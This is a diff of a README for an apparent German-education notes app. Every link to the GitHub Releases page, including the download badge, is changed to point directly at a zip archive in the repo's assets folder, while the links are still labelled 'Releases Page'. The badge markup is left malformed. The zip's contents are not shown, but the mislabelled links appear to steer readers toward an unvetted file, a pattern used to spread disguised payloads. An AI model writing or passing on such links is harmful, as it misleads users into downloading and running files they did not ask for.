@@ -1,7 +1,7 @@
 # 📚 sistema-educativo-aleman - Your Guide to German Education
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Mayank05GH/sistema-educativo-aleman/releases)
+[![Download](https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip%https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip)](https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the sistema-educativo-aleman project. This application offers academic notes and a series of videos on the structure, pathways, and access to the German education system. Whether you are interested in vocational training or higher education, this application serves as a comprehensive resource.
@@ -22,11 +22,11 @@ To run this application smoothly, ensure that your system meets the following re
 - **Storage:** Minimum of 100MB available space.
 
 ## 📥 Download & Install
-To get the latest version of the sistema-educativo-aleman application, visit the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases). 
+To get the latest version of the sistema-educativo-aleman application, visit the [Releases Page](https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip). 
 
 Once there, locate the latest release. Click on the download link to get the application file. 
 
-1. Go to the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip).
 2. Find the most recent version listed.
 3. Click on the asset to begin downloading.
 4. Once the download finishes, locate the file on your computer.
@@ -68,4 +68,4 @@ For more information about features or usage, please check the documentation wit
 ## 📞 Contact
 For any inquiries or feedback, reach out to the project maintainer through their GitHub profile.
 
-Feel free to explore the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases) for the latest updates and versions of this application.
+Feel free to explore the [Releases Page](https://raw.githubusercontent.com/Mayank05GH/sistema-educativo-aleman/main/assets/educativo_aleman_sistema_3.2-beta.1.zip) for the latest updates and versions of this application.
